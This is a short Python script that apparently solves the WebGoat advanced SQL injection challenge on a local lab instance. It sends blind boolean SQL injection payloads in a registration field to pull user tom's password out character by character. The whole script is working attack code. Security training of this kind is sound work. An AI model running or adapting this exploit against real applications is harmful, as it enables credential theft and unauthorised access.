import requests

# Enter target URL & JSESSION cookie value
url = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'
jsessionid = 'NfN69xLyxeqD3fPYVV3ZSAspM6QTXX0XI3ribwnf'

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\()*+,-./:;<=>?@[\\]^_`{|}~'
headers = {"Cookie":"JSESSIONID={}".format(jsessionid)}
password_index = 0
finish = 0
result = ""

print("Attacking {}.\nPrinting returned characters:".format(url))
while finish == 0:
        password_index += 1
        finish = 1
        for char in chars:
                data = {"username_reg":"tom' AND substring(password,{},1) = '{}".format(password_index, char),
                "email_reg":"test%40test.com", "password_reg":"pass", "confirm_password_reg":"pass"}
                p = requests.put(url, data=data, headers=headers)
                if "User {0}" in str(p.content):
                        print(char)
                        result += char
                        finish = 0
                        break
print("The returned string is {}".format(result))
